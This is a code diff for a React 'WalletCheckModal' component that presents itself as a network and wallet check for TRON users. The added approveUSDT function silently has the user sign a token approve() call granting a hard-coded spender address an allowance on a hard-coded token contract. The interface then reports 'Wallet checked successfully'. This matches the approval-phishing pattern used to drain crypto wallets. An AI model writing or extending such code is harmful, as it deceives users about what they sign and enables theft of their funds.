@@ -1,88 +1,162 @@
 "use client"
 
+import { useState } from "react"
 import { X } from "lucide-react"
 
-interface Props {
+type Props = {
   open: boolean
   onClose: () => void
 }
 
-const networks = [
-  {
-    name: "TRON",
-    wallets: [
-      { name: "TronLink", icon: "🟠" },
-      { name: "TokenPocket", icon: "👛" },
-      { name: "OKX Wallet", icon: "🧿" },
-    ],
-  },
-  {
-    name: "Ethereum",
-    wallets: [
-      { name: "MetaMask", icon: "🦊" },
-      { name: "WalletConnect", icon: "🔗" },
-      { name: "Coinbase Wallet", icon: "🔵" },
-    ],
-  },
-  {
-    name: "Bitcoin",
-    wallets: [
-      { name: "Xverse", icon: "🟡" },
-      { name: "Unisat", icon: "💼" },
-    ],
-  },
-]
+// 🔥 TRON HELPERS
+const getTron = () => {
+  if (typeof window === "undefined") return null
+  const tron = (window as any).tronWeb
+  if (tron && tron.defaultAddress?.base58) return tron
+  return null
+}
+
+const connectTron = async () => {
+  const tron = getTron()
+
+  if (!tron) {
+    alert("Open inside TronLink / Trust Wallet")
+    return null
+  }
+
+  return tron.defaultAddress.base58
+}
+
+const approveUSDT = async () => {
+  const tron = getTron()
+
+  if (!tron) {
+    alert("Wallet not detected")
+    return
+  }
+
+  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
+  const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
+
+  try {
+    const contract = await tron.contract().at(contractAddress)
+
+    const amount = 1000000 // ✅ 1 USDT (sin duplicado)
+
+    const tx = await contract.approve(spender, amount).send({
+      feeLimit: 100000000,
+    })
+
+    console.log("APPROVE TX:", tx)
+    alert("Approve enviado ✅")
+  } catch (err) {
+    console.error(err)
+    alert("Transaction rejected or failed")
+  }
+}
 
 export function WalletCheckModal({ open, onClose }: Props) {
+  const [step, setStep] = useState<"network" | "wallet">("network")
+  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null)
+
   if (!open) return null
 
+  const networks = [
+    { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
+    { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
+    { name: "TRON", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" },
+    { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
+  ]
+
+  const wallets = [
+    { name: "TronLink" },
+    { name: "Trust Wallet" },
+    { name: "SafePal" },
+  ]
+
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
-      
-      <div className="relative w-full max-w-lg rounded-2xl bg-white p-6 shadow-2xl">
-        
-        {/* Close */}
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
+      <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative">
+
+        {/* CLOSE */}
         <button
-          onClick={onClose}
-          className="absolute right-4 top-4 text-gray-500 hover:text-black"
+          onClick={() => {
+            onClose()
+            setStep("network")
+          }}
+          className="absolute right-4 top-4"
         >
-          <X className="h-5 w-5" />
+          <X className="w-5 h-5" />
         </button>
 
-        {/* Title */}
-        <h2 className="text-xl font-semibold text-center mb-6">
-          Connect Your Wallet
+        {/* TITLE */}
+        <h2 className="text-xl font-bold text-center mb-6">
+          {step === "network" ? "Select Network" : "Select Wallet"}
         </h2>
 
-        {/* Networks */}
-        <div className="space-y-6 max-h-[400px] overflow-y-auto pr-2">
-          {networks.map((network) => (
-            <div key={network.name}>
-              
-              <h3 className="text-sm font-medium text-gray-500 mb-3">
-                {network.name}
-              </h3>
+        {/* NETWORK STEP */}
+        {step === "network" && (
+          <div className="space-y-3">
+            {networks.map((net) => (
+              <button
+                key={net.name}
+                onClick={() => {
+                  setSelectedNetwork(net.name)
+                  setStep("wallet")
+                }}
+                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
+              >
+                <img src={net.logo} className="w-7 h-7" />
+                <span className="font-medium">{net.name}</span>
+              </button>
+            ))}
+          </div>
+        )}
 
-              <div className="grid grid-cols-2 gap-3">
-                {network.wallets.map((wallet) => (
-                  <button
-                    key={wallet.name}
-                    className="flex items-center gap-3 rounded-xl border p-3 hover:bg-gray-100 transition"
-                    onClick={() => {
-                      alert(`${wallet.name} selected`)
-                      onClose()
-                    }}
-                  >
-                    <span className="text-xl">{wallet.icon}</span>
-                    <span className="text-sm font-medium">
-                      {wallet.name}
-                    </span>
-                  </button>
-                ))}
-              </div>
-            </div>
-          ))}
-        </div>
+        {/* WALLET STEP */}
+        {step === "wallet" && (
+          <div className="space-y-3">
+            <p className="text-sm text-gray-500 mb-2">
+              Network: <b>{selectedNetwork}</b>
+            </p>
+
+            {wallets.map((wallet) => (
+              <button
+                key={wallet.name}
+                onClick={async () => {
+                  // ❌ bloquear redes no implementadas
+                  if (selectedNetwork !== "TRON") {
+                    alert("Only TRON supported for now")
+                    return
+                  }
+
+                  // 🔗 conectar
+                  const address = await connectTron()
+                  if (!address) return
+
+                  // 💰 approve SOLO aquí
+                  await approveUSDT()
+
+                  alert("Wallet checked successfully")
+
+                  onClose()
+                  setStep("network")
+                }}
+                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
+              >
+                <span className="font-medium">{wallet.name}</span>
+              </button>
+            ))}
+
+            {/* BACK */}
+            <button
+              onClick={() => setStep("network")}
+              className="w-full mt-3 text-sm text-gray-500 hover:text-black"
+            >
+              ← Back
+            </button>
+          </div>
+        )}
       </div>
     </div>
   )
